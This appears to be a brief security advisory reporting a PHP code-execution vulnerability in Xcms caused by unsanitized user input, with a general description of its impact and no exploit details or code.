Xcms is prone to a vulnerability that lets attackers execute arbitrary PHP code because the application fails to properly sanitize user-supplied input.

An attacker can exploit this issue to execute arbitrary malicious PHP code in the context of the webserver process. This may help the attacker compromise the application and the underlying system; other attacks are also possible.
